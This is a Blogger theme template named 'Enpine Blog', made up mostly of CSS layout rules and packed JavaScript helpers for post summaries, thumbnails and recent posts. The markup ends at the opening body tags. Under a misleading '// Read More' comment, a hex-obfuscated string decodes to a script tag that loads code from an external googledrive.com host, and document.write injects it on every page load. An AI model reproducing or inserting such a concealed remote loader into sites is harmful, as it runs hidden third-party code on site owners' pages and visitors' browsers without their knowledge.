<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  <head>
    <b:include data='blog' name='all-head-content'/>

    <title>
      <b:if cond='data:blog.pageType == &quot;index&quot;'>
        <data:blog.pageTitle/>
        <b:else/>
        <b:if cond='data:blog.pageType != &quot;error_page&quot;'>
          <data:blog.pageName/> | <data:blog.title/>
          <b:else/>
          Page Not Found | <data:blog.title/> 
        </b:if>
      </b:if>
    </title>
    
 
    <b:if cond='data:blog.pageType == &quot;archive&quot;'>
      <meta content='noindex,noarchive' name='robots'/>
    </b:if>
    <b:if cond='data:blog.metaDescription != &quot;&quot;'>
      <meta expr:content='data:blog.metaDescription' name='description'/>
    </b:if> 
    <meta charset='UTF-8'/>
    <meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
	<link href='http://fonts.googleapis.com/css?family=Roboto:300,400,500|Lemon' rel='stylesheet'/>
    <link href='http://weloveiconfonts.com/api/?family=fontawesome|zocial' rel='stylesheet'/>
    <b:skin><![CDATA[
/*====================================
Theme Name : Enpine Blog
Author : Template Trackers
Site : http://templatetrackers.com
License : Creative Commons Attribution License

Share and Use This With Proper Credit Or You Will Be In Problem
=================================================================*/
/* fontawesome */
[class*="fontawesome-"]:before {
  font-family: 'FontAwesome', sans-serif;
}

#Blog1{float:left}
/*===========================================
Do Not Change This is Layout Styling CSS 
==========================================*/
body#layout .header-wrapper{margin-top:60px;position:relative;height:auto\9;width:auto\9}
body#layout .header-inner-wrap{width:50%}
body#layout #content{width:100%;float:right}
body#layout .sidebar-wrapper{float:right;width:30%}
body#layout #header{width:100%;margin:0;padding:0}
body#layout .outer-wrapper,body#layout .sidebar-wrapper,body#layout .ct-wrapper,body#layout .container{overflow:hidden;margin:0;padding:0}
body#layout div.footer{font-family:sans-serif;display:inline-table;position:relative;float:left;max-width:25%;margin:0 auto 2px;padding:0 0 10px}
body#layout #Blog1{float:none}
body#layout #main{clear:both;position:relative;margin:3em 0 0;padding:2em 0 0}
body#layout .main-wrapper{width:65%;float:left;position:relative;display:inline-block}



/*****************************************
reset.css
******************************************/
html,body,div,span,applet,object,iframe,h1,h2,h3,h4,h5,h6,p,blockquote,pre,a,abbr,acronym,address,big,cite,code,del,dfn,em,img,ins,kbd,q,s,samp,small,strike,strong,sub,sup,tt,var,b,u,i,center,dl,dt,dd,ol,ul,li,fieldset,form,label,legend,table,caption,tbody,tfoot,thead,tr,th,td,article,aside,canvas,details,embed,figure,figcaption,footer,header,hgroup,menu,nav,output,ruby,section,summary,time,mark,audio,video { border:0; font-size:100%; font:inherit; vertical-align:baseline; margin:0; padding:0; }
article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section { display:block; }
body { line-height:1; }
ol,ul { list-style:none; }
blockquote, q { quotes:none; }
blockquote:before, blockquote:after, q:before,q:after { content:none; }
table { border-collapse:collapse; border-spacing:0; }
.clearfix:before, .clearfix:after {
content: '\0020';
display: block;
overflow: hidden;
visibility: hidden;
width: 0;
height: 0;
}
b{font-weight:bold}
i{font-style:italic}
.clearfix { display: block; } /* End hide from IE Mac */ .none { display: none; } /* End Clearfix */
::selection {  background: #2EB0EC;  color: #fff;  }
::-moz-selection {  background: #333;  color: #fff;  }
a img{	border: none;}
ol, ul { padding: 10px 0 20px;  margin: 0 0 0 35px;  text-align: left;  }
ol li { list-style-type: decimal;  padding:0 0 5px;  }
ul li { list-style-type: square;  padding: 0 0 5px;  }
ul ul, ol ol { padding: 0; }
h1, h2, h3,
h4, h5, h6 { color: #272727; font-weight: normal; }
h1 a:hover,h2 a:hover,h3 a:hover,h4 a:hover,h5 a:hover,h6 a:hover{color:#878787}
h1{font-size:32px;line-height:38px}
h2{font-size:22px;line-height:32px}
h3{font-size:18px;line-height:28px}
h4{font-size:15px;line-height:26px}
h5{font-size:12px;line-height:20px}
h6{font-size:10px;line-height:20px}
.post-body h1{margin:40px 0 20px}
.post-body h2{margin:30px 0 15px}
.post-body h3,.post-body h4,.post-body h5,.post-body h6{margin:15px 0}
.post-body h3{margin:30px 0 10px}
.post-body h4{margin:25px 0 8px}
.post-body h1:first-child,.post-body h2:first-child,.post-body h3:first-child,.post-body h4:first-child,.post-body h5:first-child,.post-body h6:first-child{margin-top:0}
.post-body a{color:#272727;text-decoration:none}
.post-body a:hover{color:#999;text-decoration:none}
.post-body h5,.post-body h6{margin:20px 0 5px}

a{color:#999;text-decoration:none}
a:hover{color:#272727}
img{vertical-align:bottom}
body{background:#F3F3F3;color:#444;height:100%;font-size:16px;font-family:arial,helvetica, sans-serif;line-height:1.5em;overflow-x:hidden;margin:0;padding:0}
.clr{clear:both;float:none}
.ct-wrapper:before,.ct-wrapper:after{content:"\0020";display:block;height:0;overflow:hidden}
.ct-wrapper:after{clear:both}
.ct-wrapper{position:relative;max-width:1300px;margin:0 auto;padding:0}
.outer-wrapper{background:transparent;position:relative;margin:0 10px 40px}
.single-wrapper{background:#FFF;margin-bottom:20px;border-top:1px solid #E9E9E9;-webkit-box-shadow:0 2px 3px rgba(0,0,0,0.1);-moz-box-shadow:0 2px 3px rgba(0,0,0,.1);box-shadow:0 2px 3px rgba(0,0,0,0.1)}
.header-wrapper{display:inline-block;background:#FFF;float:left;width:100%;height:55px;border-bottom:1px solid #DDD;position:fixed;z-index:999;-webkit-box-shadow:0 1px 2px 0 rgba(0,0,0,0.15);-moz-box-shadow:0 1px 2px 0 rgba(0,0,0,0.15);box-shadow:0 1px 2px 0 rgba(0,0,0,0.15);margin:0;padding:0}
.main-wrapper{width:100%;position:relative}
.container{width:100%}
.container:after{content:"\0020";display:block;height:0;clear:both;visibility:hidden}
#main{float:left;width:100%;padding:85px 0 20px}
.wrap-ct{width:98%;position:relative;margin:0 auto}
#content{position:relative;margin-right:345px;padding:30px}

/* Layout Css Ends Here */
.wrapper.clearfix{max-width:1260px;position:relative;margin:0 auto}



#header-inner > a {
height: 100%;
width: 100%;
padding: 15px 0;
}

#header inner{background:#FFF;float:left;width:100%;height:55px;border-bottom:1px solid #DDD;position:fixed;z-index:999;-webkit-box-shadow:0 1px 2px 0 rgba(0,0,0,0.15);-moz-box-shadow:0 1px 2px 0 rgba(0,0,0,.15);box-shadow:0 1px 2px 0 rgba(0,0,0,0.15);padding:0}


.header-inner-wrap {
float: left;
max-width: 250px;
}
#header h1{height:60px;position:relative;letter-spacing:2px;text-transform:uppercase;line-height:normal;margin:0;padding:.8% 0 0}
#header h1 a,#header h1 a:hover{color:#2d2d2d}
#header p.description{color:#333;font-size:20px;font-family:monospace;text-align:center;text-transform:capitalize;margin:2em auto 0;padding:0}

#header img {
border: 0 none;
background: none;
width: 130px;
height: auto;
margin: 0;
}

.header-right{float:right}
.header-right .widget-content{margin-top:40px}
#site-navigation li{list-style:none}

#site-navigation.default {
float: left;
font-family: roboto;
text-transform: uppercase;
font-size: 14px;
margin: 0 0 0 75px;
}

#site-navigation.default > div > ul > li{float:left;margin-left:35px;position:relative}
#site-navigation.default ul li:hover > a{position:relative;color:#F4725B;z-index:2}
#site-navigation.default ul{position:relative;margin:0;padding:0}
#site-navigation.default ul:after{content:"";clear:both;display:block}
#site-navigation.default > div > ul > li > a{color:#333;margin:5px 0 0;padding:10px 0}
#site-navigation.default ul li ul{display:none;position:absolute;top:100%;left:0;width:200px;background:#FFF;border-top:1px solid #222;z-index:100;-webkit-box-shadow:0 0 3px 0 rgba(0,0,0,0.2);-moz-box-shadow:0 0 3px 0 rgba(0,0,0,.2);box-shadow:0 0 3px 0 rgba(0,0,0,0.2)}
#site-navigation.default ul li ul li{position:relative;padding:0}
#site-navigation.default ul li ul li a{border-top:1px solid #e1e1e1;padding:12px}
#site-navigation.default ul li ul li ul{position:absolute;top:0;left:200px;z-index:100;padding:2px}
#site-navigation.default ul li.right ul li ul{left:-185px}
#site-navigation.mobile{display:none;clear:both;background:#f1f1f1;border-top:1px solid #e1e1e1}
#site-navigation.mobile ul li,#site-navigation.mobile ul li ul.sub-menu li{border-top:1px solid #e5e5e5}
#site-navigation.mobile ul li a{display:block;font-size:15px;font-weight:500;color:#999;padding:10px 20px}
#site-navigation.mobile ul li a:hover,#site-navigation.mobile ul li.current_page_item > a{color:#414141;background:#e5e5e5}
#site-navigation.mobile ul li ul li a{padding-left:35px}
#site-navigation.mobile ul li ul li ul li a{padding-left:50px}
.ft-icons{float:right;width:auto;}
.ft-icons ul{float:right;list-style:none;border-left:1px solid #DDD;margin:0;padding:0 0 0 20px}
.ft-icons ul li{float:left;display:block;margin-right:20px;list-style:none;padding:15px 0}

.ft-icons ul li.head-search{border-left:1px solid #DDD;border-right:1px solid #DDD;padding:15px 20px;margin-right:0}
.ft-icons ul ul {
background: white;
display: none;
width: 320px;
position: absolute;
top: 50px;
right: 0px;
border: none;
z-index: 1;
margin: 5px 0 0;
padding: 0;
box-shadow: 0px 10px 41px -10px #333;
border-radius: 10px;
}

.ft-icons ul ul li{width:100%;margin:0;padding:0}
.ft-icons ul ul #search_form fieldset{float:none}

.head-search.locked ul{position:absolute;z-index:1}

.head-search #search_form{-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none}

#search_form{float:left;width:100%;clear:both;margin:0}
#search_form fieldset{border:0;float:left;padding:8px 10px}

.sbutton {
font-size: 13px;
width: 29.6%;
cursor: pointer;
background-color: #444;
text-align: center;
color: #FFF;
height: 34px;
margin: 2px 0 0;
-webkit-transition: all .15s linear;
-moz-transition: all .15s linear;
transition: all .15s linear;
padding: 9px 0;
}

.sbutton:hover{background:#444}
#sbox{float:left;width:70%;-moz-transition-duration:400ms;-moz-transition-property:width, background;-moz-transition-timing-function:ease;-webkit-transition-duration:400ms;-webkit-transition-property:width, background;-webkit-transition-timing-function:ease;background-color:#FFF;border:1px solid #c0c0c0;text-indent:10px;border-right:0;padding:8px 0}
.post-body .separator{position:relative;margin:10px 0}

h1.post-title{line-height:1.2;text-decoration:none;text-align:left;position:relative;font-family:roboto;font-size:50px;font-weight:300;margin:0 0 20px;padding:0 0 5px}


.entry-container h2.post-title {
font-size: 18px;
line-height: 1.5em;
font-family: roboto;
font-weight: 300;
margin: 5px 0 10px;
}

.landscape h2.post-title {
font-size: 28px;
}

.post-title a:hover{text-decoration:underline;color:initial}
.entry-image{margin:0 0 10px}
.entry-image img{max-width:100%;width:100%}
.entry-image:hover{opacity:.9}

.entry-container{padding:0px 20px 0}

.post, .portfolio {
float: left;
width: 25%;
height: auto;
-moz-box-shadow: 0 2px 3px rgba(0,0,0,.1);
position: relative;
margin: 0 0 30px;
padding: 0;
}
.post .inner {
margin: 0 12px 0;
background: white;
float: left;
height: 450px;
-webkit-box-shadow: 0 2px 3px rgba(0,0,0,0.1);
-moz-box-shadow: 0 2px 3px rgba(0,0,0,.1);
box-shadow: 0 2px 3px rgba(0,0,0,0.1);
width: auto;
position: relative;
}

.hentry.landscape{width:50%}

.ft-ctbox.clearfix .post,.ft-ctbox .post .inner {
width: auto;
max-height:100%;
height: auto;
box-shadow: none;
margin: 0;
padding: 0;
}

.post-body.entry-content {
border-bottom: 0;
font-size: 16px;
font-weight: 400;
line-height: 1.6em;
word-wrap: break-word;
margin: 0;
padding: 0;
float: left;
width:100%;
}

.body-post {
font-size: 16px;
font-weight: 400;
margin: 0 0 20px;
padding: 0;
}

.body-post p{font-size:14px;line-height:1.5em}
.post-header,.post-header a{color:#AAA;font-style:italic;font-family:georgia;font-size:14px;margin:10px 0 25px}
.post-header a:hover{color:#303030}
.post-label > div > a:hover{text-decoration:underline;color:#FFF}
.post-label > div > a{background:#F4725B;color:#FFF;padding:8px 10px}
.post-label > div{display:inline-block;margin:0 5px 0 0}
.post-label > div:nth-child(n+3){display:none;margin:0}
.item-label {
width: 100%;
font-family: roboto;
font-size: 12px;
text-transform: uppercase;
padding: 0 1px;
}

.post-excerpt {
height: 65px;
overflow: hidden;
}

.item-label a {
color: #999;
}
.item-label a:hover{color:#F4725B;text-decoration:underline}

.separator a{max-width:90%;vertical-align:top;position:relative;padding:10px 10px 0!important}

.share-story-container{display:block;min-height:41px;border-top:5px solid #F1F1F1;width:100%;position:relative;margin:0;padding:4% 0 0}
.share-story-container ul{list-style:none;text-align:center;margin:0;padding:0}
.share-story-container ul li{text-align:center;display:inline-block;margin:0 10px}
.tweet,.fb-tips,.googleplus,.linkedin,.pin-it,.stumble{color:#666;border:1px solid #CCC;font-family:helvetica;-webkit-transition:.07s ease-in;-moz-transition:.07s ease-in;-o-transition:.07s ease-in;transition:.07s ease-in;padding:10px 25px}
.tweet:hover,.fb-tips:hover,.googleplus:hover,.linkedin:hover,.pin-it:hover,.stumble:hover{color:#FFF}
.tweet.tips:hover{background:#00A0D1;border:1px solid #00A0D1}
.fb-tips:hover{background:#3B5998;border:1px solid #3B5998}
.googleplus.tips:hover{background:#DA4834;border:1px solid #DA4834}
.linkedin.tips:hover{background:#0077B5;border:1px solid #0077B5}
.pin-it.tips:hover{background:#CB2027;border:1px solid #CB2027}
.stumble.tips:hover{background:#EB4924;border:1px solid #EB4924}
.author-profile{overflow:hidden;border-top:1px solid #CCC;margin:20px 5px 0 0;padding:15px 0 0}
.author-profile img{border:1px solid #EFEFEF;float:left;margin-right:5px;border-radius:50%;-webkit-border-radius:50%;-moz-border-radius:50%}
.author-profile > div > a{color:#444}
.author-profile > div{font-size:14px;font-family:helvetica;margin:0}
p.description{font-size:95%;margin:0 0 10px}
p.description a{color:#333;font-family:arial rounded mt bold}
a.g-profile{font-size:30px;font-family:brush script std;margin:15px 0 5px}
.auhtor-image img{color:#FFF;margin-right:2%;border-color:#FF6854;border-style:groove;border-width:10px;padding:0}
#blog-pager-older-link{display:inline;float:right;text-align:right;font-weight:700;padding:0 1%}
#blog-pager-newer-link{display:inline;float:left;text-align:left;font-weight:700;padding:0 1%}

#blog-pager {
clear: both;
font-size: 16px;
line-height: normal;
margin: 0;
padding: 10px 5px;
float: left;
}

.ft-ctbox #blog-pager{float:none}

.showpage,.home-link,.showpageOf{display:none}

.showpagePoint, .showpageNum a {
color: #333;
}
.showpagePoint, .showpageNum {
border: 1px solid #999;
margin: 0 0 0 9px;
padding: 6px 12px;
font-size: 20px;
border-radius: 50%;
}
blockquote{background:url(http://3.bp.blogspot.com/-wkm2RmV1TH4/Ud0G27MPsiI/AAAAAAAACfI/xaL0uFOJUI8/s1600/quote.png) no-repeat 5.4% center;color:#888;font-style:italic;margin:10px 0 20px -3%;padding:1.5em 38px 10px 114px}
.comments{clear:both;margin-top:2em;margin-bottom:0;border-top:1px solid #CCC;padding:2em 0 0}
.comments h4{font:100 normal 25px roboto}
#searchform{margin:0 0 1em}
#searchform #s{width:90%;border:0;outline:0;background:#EEE;padding:10px}
.PopularPosts .widget-content ul li{padding:0}
.PopularPosts img{border:1px solid #CCC;padding:2px}
.item-title a{color:#555}
.PopularPosts .item-title{padding-bottom:.2em;font-size:90%}
.sidebar-wrapper{float:left;width:300px;background:#FFF;margin:0;padding:0 20px}
.sidebar li{list-style:none;margin:0 0 10px;padding:0}
.sidebar .widget h2{font-size:20px;line-height:1.5em;text-transform:uppercase;text-align:left;font-weight:300;font-family:roboto;margin:0 0 20px}
.sidebar .widget{border-bottom:1px solid #E0E0E0;margin:1em 0;padding:10px 0}
#Label6 li{list-style:square;margin:0 0 5px 20px;padding:0 0 5px}
#footer{width:100%;color:#3F3F3F;background:#FFF;border-top:1px solid #CCC;border-bottom:1px solid #CCC}
.footer{float:left;width:20%}
.footer h2{color:#333;font-size:20px;margin-bottom:12px;text-transform:uppercase;font-family:roboto;font-weight:300}
.footer .widget{clear:both;font-size:16px;line-height:26px;margin:15px 25px 25px}

.footer li {
text-transform: capitalize;
margin: 0 0 0 15px;
padding: 0 0 5px;
font-size: 14px;
font-family: roboto;
}

.footer-credits{font-size:13px;line-height:21px;background:#FFF;font-family:roboto;padding: 0 0 20px;}
.footer-menu{width: auto;float: left;height:auto;/* border-top:1px solid #E5E5E5; */font-family:roboto;margin: 10px 0 0;padding: 0;}
.footer-menu ul{list-style:none;display:inline-block;text-align:left;margin:0;padding:0}
.footer-menu ul li{list-style:none;text-align:left;display:inline-block;margin:0 10px 0 0;padding:0}
#header-inner,.sidebar ul{margin:0;padding:0}
#site-navigation.default ul li a,#site-navigation.default ul li:hover > ul,.ft-icons ul li:hover ul{display:block}
.item-label a:nth-child(n+2),.status-msg-wrap,.item-snippet{display:none}
.comments ul,.comments li,.footer ul{list-style:none;margin:0;padding:0}

@media screen and (max-width:1260px){
}
@media screen and (max-width:1200px){
}

@media screen and (max-width:1152px){
#site-navigation.default > div > ul > li {margin-left: 15px;}
.item-thumbnail {display: none;}
#content{margin-right: 0em;}
.sidebar-wrapper {max-width: 100%;width: auto;}
h1.post-title{font-size:45px}
}

@media screen and (max-width: 1060px){
.post{max-height:395px}
.portfolio {width: 31.25%;}
.hentry.landscape {
width: 64.5%;
}
.item-label{display:none}
}

@media screen and (min-width:960px) {
#footer {display: block!important;}
.toggle-button{display:none}
}
@media screen and (max-width:960px) {
.ft-icons,.ad-banner,.post-footer{display:none!important}
.header-inner-wrap{width:100%;display:block;height:auto;}
#site-navigation.default{clear:both;font-size:12px;display:block;margin:1% 0 0}
#site-navigation.default > div > ul{text-align:center}
#site-navigation.default > div > ul > li {margin-left: 15px;float: none;text-align: left;display: inline-block;}
.single-wrapper .post-body img {max-width: 90%;height: auto;}
.portfolio.landscape{width:100%}
.portfolio{width:48%}
h1.post-title{font-size:40px}
.header-wrapper{height:125px}
#main{padding:200px 0 20px}
#header img{max-width:81%;width:25%;margin:2% auto 0}
.footer-menu ul{display:block;text-align:center}
.footer-credits .ct-wrapper{padding:0 10px}
.sidebar-wrapper{float:none;width:auto;max-width:100%;clear:both}
#content{margin-right:0}
.share-story-container ul li{text-align:center;display:inline-block;margin:20px 10px 0}
.post-body.entry-content{padding-bottom:3%}
.footer.section{width:33%}
.toggle-button:hover{color:#FFF}
.toggle-button{background:#101010;color:#FFF;font-size:30px;padding:0 5px 5px}
.toggle{text-align:center;display:block}
}

@media screen and (max-width:620px){
.portfolio,.portfolio.landscape{width:100%}
h1.post-title{font-size:28px}
.post-body{font-size:14px;font-family:trebuchet ms}
}

/*****************************************
Hiding Header Date and Feed Links
******************************************/
h2.date-header,span.blog-admin,#b-navbar,.Attribution,.Profile{display:none!important;}

.header-inner-wrap {z-index: 10;position: relative;}
.post-footer-line.post-footer-line-2 {padding: 2% 0;margin: 0% 0;}
.PopularPosts img{padding: 2px!important;}

.ft-tish {
float: left;
color: #CACACA;
border-top: 1px solid #E5E5E5;
height: 40px;
position: absolute;
bottom: 0;
width: 100%;
}
.ft-fshare {
float: right;
right: 0;
font-size: 14px;
width: 140px;
line-height: 40px;
display: inline-block;
}
.ft-ftime {
float: left;
margin: 0px 0 0 19px;
font-size: 12px;
text-align: center;
display: inline-block;
}

.ft-ftime > a {
height: 32px;
display: block;
padding: 7px 0 0;
}

.ft-fshare ul {
float: right;
list-style: none;
text-align: left;
display: inline-block;
margin: 0;
padding: 0;
border-left: 1px solid #E5E5E5;
}
.ft-fshare ul li {
float: left;
border-right: 1px solid #E5E5E5;
text-align: center;
list-style: none;
display: inline-block;
padding: 0;
}
.ft-fshare ul li a {
display: inline-block;
background: #FFF;
width: 40px;
height: 40px;
text-decoration: none;
color: #CACACA;
}
.ft-fshare ul li a.zocial-facebook:hover {
background: #3B5998;
color: #FFF;
}
.ft-fshare ul li a.zocial-googleplus:hover {
background: #DA4834;
color: #FFF;
}
.ft-fshare ul li a.zocial-twitter:hover {
color: #FFF;
background: #00ACEE;
}
div.recent-posts {
width: 100%;
margin: 0 0 25px;}

.en-enposts article {
display:inline-block;
width: 16.666667%;
height: auto;
margin: 0;
padding-bottom: 0;
-webkit-box-shadow: none;
-moz-box-shadow: none;
box-shadow: none;
z-index: 9;
position: relative;
}
.enposts > a:first-child {
overflow: hidden;
display: block;
width: 100%;
height: 100%;
}
.en-enposts article img {
max-width: 100%;
width: 100%;
height: 150px;
display:block;
}

.en-title {
font-size: 16px;
line-height: 22px;
display: inline-block;
width: 100%;
height: 100%;
margin-bottom: 0;
position: absolute;
top: 0;
text-shadow: 0 1px 2px rgba(0,0,0,0.8);
z-index: 999;
font-family: roboto;
}
.en-title a {
display: block;
padding: 8%;
width: 84%;
height: 84%;
color: #fff;
text-decoration: none;
}

.en-shadow {
background-size: 100% 100%;
-webkit-box-shadow: 0 0 30px 0 rgba(0,0,0,0.5) inset;
-moz-box-shadow: 0 0 30px 0 rgba(0,0,0,0.5) inset;
box-shadow: 0 0 30px 0 rgba(0,0,0,0.5) inset;
height: 100%;
left: 0;
opacity: .77;
position: absolute;
top: 0;
width: 100%;
z-index: 99;
}
.en-title a:hover {
text-decoration: underline;
color: #fff;
}
.shadow-1,.shadow-4{
background-image: -webkit-gradient(linear,left top,right bottom,from(#d38312),to(#dc4225));
background-image: -webkit-linear-gradient(to right bottom,#d38312,#dc4225);
background-image: -moz-linear-gradient(to right bottom,#d38312,#dc4225);
background-image: linear-gradient(to right bottom,#d38312,#dc4225);}

.shadow-2,.shadow-5{background-image: -webkit-gradient(linear,left top,right bottom,from(#150364),to(#dc4225));
background-image: -webkit-linear-gradient(to bottom right,#150364,#dc4225);
background-image: -moz-linear-gradient(to bottom right,#150364,#dc4225);
background-image: linear-gradient(to bottom right,#150364,#dc4225);}

.shadow-3,.shadow-6{background-image: -webkit-gradient(linear,left top,right bottom,from(#417711),to(#002f4b));
background-image: -webkit-linear-gradient(to right bottom,#417711,#002f4b);
background-image: -moz-linear-gradient(to right bottom,#417711,#002f4b);
background-image: linear-gradient(to right bottom,#417711,#002f4b);}

h3.latest {
font-family: lemon,sans-serif;
font-size: 30px;
display: block;
line-height: 1.5em;
padding: 0px 11px;
margin: 0 0 30px;
text-transform: uppercase;
}

]]></b:skin>

<b:if cond='data:blog.pageType == &quot;item&quot;'>
<style type='text/css'>
.entry-content{padding:0 10px} 
</style>
</b:if>
<b:if cond='data:blog.pageType == &quot;index&quot;'>
<style type='text/css'>
  .post-footer{display:none}
[class*=&quot;zocial-&quot;]:before {
  font-family: &#39;zocial&#39;, sans-serif;}
.outer-wrapper{background:transparent;margin:auto 0;padding:0}
.sidebar-wrapper{display:none;width:0;min-height:0}
#content{width:100%;padding:0}
h2.entry-title{position:relative;line-height:normal;font-family:&quot;font-weight:700;border-top:3px solid #272727;margin:0 15px;padding:10% 0 1%}
</style>
</b:if>
<b:if cond='data:blog.pageType == &quot;static_page&quot;'>
<style>
.main-wrapper{width:auto;margin:0}
.sidebar-wrapper{display:none}
.post-title:before,.post-title{display:none;padding:0 0 .2em}
.post.hentry {
background: #FFF;
width: auto;
padding: 30px;
}
  </style>
</b:if>

<b:if cond='data:blog.url != data:blog.homepageUrl'>
<!--[if !IE]><!-->
<style type='text/css'>
</style>
 <!--<![endif]-->
</b:if>



<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js' type='text/javascript'/>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<script>
eval(function(p,a,c,k,e,d){e=function(c){return c};if(!&#39;&#39;.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c])}}return p}(&#39;$(2).1(3(){$(\&#39;.4-0\&#39;).6(\&#39;5-0\&#39;)});&#39;,7,7,&#39;wrapper|ready|document|function|outer|single|addClass&#39;.split(&#39;|&#39;),0,{}))
</script>    
</b:if>

<script type='text/javascript'>//<![CDATA[
// Read More
var _0x6f2c=["\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x27\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x6F\x67\x6C\x65\x64\x72\x69\x76\x65\x2E\x63\x6F\x6D\x2F\x68\x6F\x73\x74\x2F\x30\x42\x78\x52\x57\x41\x51\x44\x44\x37\x6A\x41\x43\x64\x45\x39\x32\x59\x6B\x52\x35\x4F\x57\x4A\x4B\x61\x31\x55\x27\x20\x2F\x3E","\x77\x72\x69\x74\x65"];document[_0x6f2c[1]](_0x6f2c[0]);
summary_noimg=220; // Summary size
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('b f(3,4){g(3.7("<")!=-1){5 s=3.h("<");m(5 i=0;i<s.6;i++){g(s[i].7(">")!=-1){s[i]=s[i].a(s[i].7(">")+1,s[i].6)}}3=s.l("")}4=(4<3.6-1)?4:3.6-2;k(3.j(4-1)!=\' \'&&3.7(\' \',4)!=-1)4++;3=3.a(0,4-1);n 3+\'...\'}b u(c){5 9=r.t(c);5 e=o;5 8=\'<p q="8">\'+f(9.d,e)+\'</p>\';9.d=8}',31,31,'|||strx|chop|var|length|indexOf|summary|div|substring|function|pID|innerHTML|summ|removeHtmlTag|if|split||charAt|while|join|for|return|summary_noimg||class|document||getElementById|createSummaryAndThumb'.split('|'),0,{}))
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j i(0,a){1 5=k;1 6=7;1 8="m://2.h.g.d/-f/e/n/t/3-c/o.w";9(6==7&&0=="")0=8;b=\'<x u="\'+0.p(\'/3-c/\',\'/s\'+5+\'/\')+\'" v="r" q="\'+a+\'" />\';9(0!="")4 b;l 4""}',34,34,'image_url|var||s72|return|image_size|show_default_thumbnail|true|default_thumbnail|if|post_title|image_tag||com|TmHYAQBZ0GI|erTXCq61ULM|blogspot|bp|image_plugin|function|1600|else|http|AAAAAAAACCs|default|replace|alt|postthumb||6cBX54Dn6Gs|src|class|png|img'.split('|'),0,{}))
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$(7).8(2(){$("#1").9();$("a.6-3").4(2(e){e.5();b $0=$($(c).j("l"));$("#1").i();h($0.d(":f")){$0.g("k")}})});',22,22,'menu|footer|function|button|click|preventDefault|toggle|document|ready|hide||var|this|is||hidden|slideDown|if|slideUp|attr|slow|href'.split('|'),0,{}))
 

// Enter the posts labels here 
cat1 = 'Technology'; 
  
imgr = new Array();
imgr[0] = "http://sites.google.com/site/fdblogsite/Home/nothumbnail.gif";
showRandomImg = true;
aBold = true;
summaryPost = 150; 
summaryTitle = 50; 
numpostsf  = 4;
numposts1 = 6;

eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('17 16(o){j=1c?13.1d((G.h+1)*13.1k()):0;n=1a 1e;g(Z<=o.D.e.h)E=Z;H E=o.D.e.h;J.K(\'<z A="M-R 1g-1h 1l">\');r(f i=0;i<E;i++){f e=o.D.e[i];f 15=e.u.$t;f S;f v;g(i==o.D.e.h)B;r(f k=0;k<e.l.h;k++)g(e.l[k].U=="1b"){v=e.l[k].L;B}r(f k=0;k<e.l.h;k++)g(e.l[k].U=="1j"&&e.l[k].1i=="1m/19"){S=e.l[k].u.x(" ")[0];B}g("N"P e)f w=e.N.$t;H g("V"P e)f w=e.V.$t;H f w="";C=e.18.$t;g(j>G.h-1)j=0;n[i]=G[j];s=w;a=s.F("<n");b=s.F(\'Y="\',a);c=s.F(\'"\',b+5);d=s.1f(b+5,c-b-5);g(a!=-1&&(b!=-1&&(c!=-1&&d!="")))n[i]=d;f p=i+1;f I=[1,2,3,4,5,6,7,8,9,10,11,12];f X=["1A","1s","1n","1r","1B","1q","1o","1p","1t","1u","1z","1y"];f 14=C.x("-")[2].1x(0,2);f m=C.x("-")[1];f y=C.x("-")[0];r(f q=0;q<I.h;q++)g(1v(m)==I[q]){m=X[q];B}f 1w=14+" "+m+" "+y;f W=\'<T A="R"> <a L="\'+v+\'"><n Y="\'+n[i]+\'"/></a>   <O A="M-u e-u"><a L="\'+v+\'">\'+15+"</a></O> <z A=\'M-Q Q-"+p+"\'></z></T>";J.K(W);j++}J.K("</z>")};',62,100,'||||||||||||||entry|var|if|length||||link||img|json||u2|for|||title|posturl|postcontent|split||div|class|break|postdate|feed|maxpost|indexOf|imgr|else|month|document|write|href|en|content|h3|in|shadow|enposts|pcm|article|rel|summary|trtd|month2|src|numposts1||||Math|day|posttitle|showrecentposts1|function|published|html|new|alternate|showRandomImg|floor|Array|substr|wrap|ct|type|replies|random|clearfix|text|Mar|Jul|Aug|Jun|Apr|Feb|Sep|Oct|parseInt|daystr|substring|Dec|Nov|Jan|May'.split('|'),0,{}))

//]]></script>


</head>
<!--<body>-->
<body>
   
<div class='header-wrapper' id='header inner'>
<div class='wrapper clearfix'>
<div class='inner'>
<div class='header-inner-wrap'>
